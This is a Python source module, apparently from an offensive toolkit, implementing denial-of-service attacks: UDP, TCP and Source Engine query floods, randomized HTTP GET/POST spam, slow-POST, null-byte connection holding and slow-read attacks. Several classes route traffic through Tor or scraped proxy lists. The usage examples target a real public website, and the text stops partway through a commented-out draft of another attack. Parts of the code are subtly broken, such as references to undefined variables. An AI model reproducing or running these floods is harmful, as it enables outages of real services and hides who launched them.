import requests,cfscrape,socks,os,sys,urllib,socket,random,time,threading,ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#import the dependencies for each python version
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    import urllib2
    from scapy.config import conf
    conf.ipv6_enabled = False
    from scapy.all import *
else:
    # Python 3.x
    import http.client
    httplib = http.client
    import urllib.request
    urllib2=urllib.request
    from kamene.config import conf
    conf.ipv6_enabled = False
    from kamene.all import *
from struct import *
from bane.iot import getip
from bane.payloads import *
from bane.proxer import *
if os.path.isdir('/data/data')==True:
    adr=True#the device is an android
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True#the application which runs the module is Termux
if ((termux==False) or (adr==False)):
 from bane.swtch import *



def get_public_dns(timeout=15):
 try:
  return (requests.get('https://public-dns.info/nameservers.txt',timeout=timeout).text).split('\n')
 except:
  return []



def reset():#reset all values
 global counter
 counter=0
 global stop
 stop=False
 global coo
 coo=False
 global ual
 ual=[]
 global flag
 flag=-1
 global ier
 ier=0
 global pointer
 pointer=0
 global ue
 ue=[]
 
'''
   the following classes are for DoS attacks simulations with different tools that have been either originally written in 
   diffferent languages (Perl: slowloris and C: xerxes and slow_read attack...) and rewritten in python and other python tools that are PoC for 
   some vulnerabilities (slow post attacks, hulk) with some modifications that has improved their performance!!!
'''

class udp_flood:
 def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
  self.target=u
  self.port=p
  self.interval=interval
  self.min_size=min_size
  self.max_size=max_size
  self.connection=connection
  self.duration=duration
  self.limiting=limiting
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  tm=time.time()
  size=0
  try:
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     if self.connection==True:
      s.connect((self.target,p))
     msg=''
     for x in range(random.randint(self.min_size,self.max_size)):
      msg+=random.choice(lis)
     if len(msg)>1400:
       msg=msg[0:1400]#make sure all payloads' sizes are on the right range
     s.sendto((msg.encode('utf-8')),(self.target,self.port))
     size+=len(msg)
     self.counter+=1
     if((self.logs==True) and (int(time.time()-tm)==1)):
      sys.stdout.write("\rPackets: {} | Bytes/s: {}   ".format(self.counter,size))
      sys.stdout.flush()
      tm=time.time()
      size=0
     if self.limiting==True:
      time.sleep(self.interval)
    except:
     try:
      time.sleep(self.interval)
     except:
      pass
   self.kill() 
  except:
    pass
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  self.reset()#this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
  return a
  
class vse_flood:
 def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
  self.target=u
  self.port=p
  self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
  self.interval=interval
  self.connection=connection
  self.duration=duration
  self.limiting=limiting
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  tm=time.time()
  try:
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     if self.connection==True:
      s.connect((self.target,self.port))
     s.sendto(self.payload,(self.target,p))
     self.counter+=1
     if((self.logs==True) and (int(time.time()-tm)==1)):
      sys.stdout.write("\rPackets: {}   ".format(self.counter))
      sys.stdout.flush()
      tm=time.time()
     if self.limiting==True:
      time.sleep(self.interval)
    except:
     pass
     try:
      time.sleep(self.interval)
     except:
      pass
   self.kill()
  except:
   pass
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a



class tcp_flood:
 def __init__(self,u,p=80,threads_daemon=False,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.min_size=min_size
  self.max_size=max_size
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)#give time for all threads to be created
  while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout=(self.timeout)#we can't set timeout with socks module if we are going to use a socks proxy
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)#let the traffic go through tor
     s.connect((self.target,self.port))#connect to target 
     if (self.port==443) or (self.port==8443):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)#use ssl if needed on specific ports
     for l in range(random.randint(self.round_min,self.round_max)):#send packets with random number of times for each connection (number between "round_min" and "round_max")
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if stop==True:
       break
      m=''
      for li in range(random.randint(self.min_size,self.max_size)): #each payload' size is chosen randomly between maximum and minimum values
       m+=random.choice(lis)
      try:
       if stop==True:
        break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rPackets: {} | Bytes: {}   ".format(tcp_counter,len(m)))
        sys.stdout.flush()
        #print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
      except:
       break
      time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a
 
'''
  usage:

  >>>bane.tcp_flood('www.google.com')

  >>>bane.tcp_flood('www.google.com',p=80, threads=150, timeout=5)

  p: (set by default to: 80) targeted port
  threads: (set by default to: 256) threads to use
  timeout: (set by default to: 5) timeout flag
'''



class http_spam:
 def __init__(self,u,p=80,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  self.paths=paths
  self.post_min=post_min
  self.post_max=post_max
  self.post_field_max=post_field_max
  self.post_field_min=post_field_min
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
      break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout=(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     for fg in range(random.randint(self.round_min,self.round_max)):
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if stop==True: 
       break
      pa=random.choice(self.paths)#bypassing cache engine
      q=''
      for i in range(random.randint(2,5)):
       q+=random.choice(lis)+str(random.randint(1,100000))
      p=''
      for i in range(random.randint(2,5)):
       p+=random.choice(lis)+str(random.randint(1,100000))
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      #setting random headers
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
        ed+=', '
        ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      if kl==1:
       req="GET"
       m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
      else:
       req="POST"
       k=''
       for _ in range(random.randint(self.post_field_min,self.post_field_max)):
        k+=random.choice(lis)
       j=''
       for x in range(random.randint(self.post_min,self.post_max)):
        j+=random.choice(lis)
       par =k+'='+j
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
      try:
       if self.stop==True:
         break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
        sys.stdout.flush()
        #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
      except:
       break
      time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
   self.kill()
  except:
   pass
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  
  self.reset()
  return a


class prox_http_spam(threading.Thread):
 def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.stop=False
  self.counter=0
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  self.paths=paths
  self.post_min=post_min
  self.post_max=post_max
  self.post_field_max=post_field_max
  self.post_field_min=post_field_min
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try:
    bot_type=[]
    if len(self.httplist)>0:
     bot_type.append("h")
    if len(self.socks4list)>0:
     bot_type.append("s4")
    if len(self.socks5list)>0:
     bot_type.append("s5")
    z=random.choice(bot_type)
    if z=="h":
     line=random.choice(self.httplist)
    elif z=="s4":
     line=random.choice(self.socks4list)
    elif z=="s5":
     line=random.choice(self.socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if z=="h":
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif z=="s4":
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif z=="s5":
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    if z=="h":
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for fg in range(random.randint(self.round_min,self.round_max)):
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
     if stop==True:
      break
     for l in range(random.randint(1,5)):
      ed=random.choice(ec)
      oi=random.randint(1,3)
      if oi==2:
       gy=0
       while gy<1:
        df=random.choice(ec)
        if df!=ed:
         gy+=1
       ed+=', '
       ed+=df
     l=random.choice(al)
     for n in range(random.randint(0,5)):
      l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
     pa=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     kl=random.randint(1,2)
     if kl==1:
      req="GET"
      m='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)
     else:
      req="POST"
      k=''
      for _ in range(random.randint(self.post_field_min,self.post_field_max)):
       k+=random.choice(lis)
      j=''
      for x in range(random.randint(self.post_min,self.post_max)):
       j+=random.choice(lis)
      par =k+'='+j
      m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,par)
     try:
      if stop==True:
        break
      s.send(m.encode('utf-8'))
      self.counter+=1
      if self.logs==True:
        sys.stdout.write("\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(ipp,self.counter,req,len(m)))
        sys.stdout.flush()
        #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
     except:
      break
     time.sleep(self.interval)
    s.close()
   except:
    pass
   time.sleep(.1)
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a


class torshammer:
 def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
  self.counter=0
  self.max_content=max_content
  self.min_content=min_content
  self.stop=False
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.logs=logs
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    self.counter+=1
    if self.logs==True:
        sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
        sys.stdout.flush()
        #print("Connected to {}:{}...".format(self.target,self.port))
    if ((self.port==443) or (self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(self.min_content,self.max_content)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
    for i in range(q):
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
      break
     h=random.choice(lis)
     try:
      s.send(h.encode('utf-8'))
      if self.logs==True:
        sys.stdout.write("\rPosted: {}".format(h))
        sys.stdout.flush()
        #print("Posted: {}".format(h))
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
   except:
    pass
   self.counter-=1
   time.sleep(.1)
   if self.stop==True:
    break
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a



class prox_hammer:
 def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.stop=False
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.max_content=max_content
  self.min_content=min_content
  self.logs=logs
  self.counter=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try:
    bot_type=[]
    if len(self.httplist)>0:
     bot_type.append("h")
    if len(self.socks4list)>0:
     bot_type.append("s4")
    if len(self.socks5list)>0:
     bot_type.append("s5")
    z=random.choice(bot_type)
    if z=="h":
     line=random.choice(self.httplist)
    elif z=="s4":
     line=random.choice(self.socks4list)
    elif z=="s5":
     line=random.choice(self.socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if z=="h":
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif z=="s4":
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif z=="s5":
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    if z=="h":
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    self.counter+=1
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    q=random.randint(self.min_content,self.max_content)
    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
    for i in range(q):
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
      break
     h=random.choice(lis)
     try:
      s.send(h.encode('utf-8'))
      if self.logs==True:
        sys.stdout.write("\rPosted: {} --> {}".format(h,ipp))
        sys.stdout.flush()
        #print("Posted: {} --> {}".format(h,ipp))
      time.sleep(random.uniform(.1,3))
     except:
      break
    s.close()
   except:
    pass
   self.counter-=1
   time.sleep(.1)
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a


class xerxes:
 def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,duration=60,logs=False,tor=False):
  self.counter=0
  self.target=u
  self.port=p
  self.stop=False
  self.duration=duration
  self.timeout=timeout
  self.tor=tor
  self.start=time.time()
  self.logs=logs
  self.id_key=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
   self.id_key+=1
 def attack(self):
  x=self.id_key
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try:
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    self.counter+=1
    """if self.logs==True:
     #print("[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.flush()"""
    while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
      break
     try:
      s.send("\x00".encode('utf-8'))#send NULL character
      if self.logs==True:
       sys.stdout.write("\r[{}: Voly sent]    ".format(x))
       sys.stdout.flush()
     except:
      break
     time.sleep(.2)
   except:
      pass
   self.counter-=1
   time.sleep(.3)
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a


class prox_xerxes:
 def __init__(self,u,scraping_timeout=15,p=80,threads_daemon=False,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.logs=logs
  self.id_key=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
   self.id_key+=1
 def attack(self):
  x=self.id_key
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try:
    bot_type=[]
    if len(self.httplist)>0:
     bot_type.append("h")
    if len(self.socks4list)>0:
     bot_type.append("s4")
    if len(self.socks5list)>0:
     bot_type.append("s5")
    z=random.choice(bot_type)
    if z=="h":
     line=random.choice(self.httplist)
    elif z=="s4":
     line=random.choice(self.socks4list)
    elif z=="s5":
     line=random.choice(self.socks5list)
    ipp=line.split(":")[0].split("=")[0]
    pp=line.split(":")[1].split("=")[0]
    s =socks.socksocket()
    if z=="h":
     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
    elif z=="s4":
     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
    elif z=="s5":
     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
    if z=="h":
     s.settimeout(self.timeout)
    s.connect((self.target,self.port))
    self.counter+=1
    while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
      break
     try:
      s.send("\x00".encode('utf-8'))#send NULL character
      if self.logs==True:
       sys.stdout.write("\r[{}: Voly sent-->{}]     ".format(x,ipp))
       sys.stdout.flush()
     except:
      break
     time.sleep(.2)
   except:
    pass
   self.counter-=1
   time.sleep(.3)
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a
  
'''
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   timeout: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slow_read_attack('www.google.com',p=443,threads=300,timeout=7)

'''

class slow_read:
 def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
  self.counter=0
  self.stop=False
  self.target=u
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.read_max=max_read
  self.read_min=min_read
  self.min_speed=min_speed
  self.max_speed=max_speed
  self.logs=logs
  self.duration=duration
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  time.sleep(1)
  while True:
   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
   if self.stop==True:
     break
   try: 
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target,self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
     if self.stop==True:
      break
     pa=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
      self.counter+=1
      while True:    
       d=s.recv(random.randint(self.read_min,self.read_max))
       if self.logs==True:
        sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
        sys.stdout.flush()
        #print("Received: {}".format(str(d.decode('utf-8'))))
       time.sleep(random.randint(self.min_speed,self.max_speed))
     except:
      break
    s.close()
   except:
    pass
  self.kill()
 def reset(self):
   for x in self.__dict__:
    self.__dict__[x]=None
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  while(self.thread_count>0):
   time.sleep(0.1)
  self.reset()
  return a
   
#This is a on process work for next versions
"""

class apa(threading.Thread):
 def run(self):
  global apache_killer_counter
  self.target=target
  self.port=port
  self.timeout=_timeout
  self.tor=tor
  self.round_min=packs2
  self.round_max=packs1
  self.interval=speed
  time.sleep(2)
  while (stop!=True):
   try:
    apache="5-0"
    for x in range(1,random.randint(1200,1300)):
     apache+=',5-'+str(x)
    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    if self.tor==False:
     s.settimeout(self.timeout)
    if self.tor==True:
     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
    s.connect((self.target, self.port))
    if ((self.port==443)or(self.port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    for x in range(random.randint(self.round_min,self.round_max)):
     if stop==True:
      break
     try:
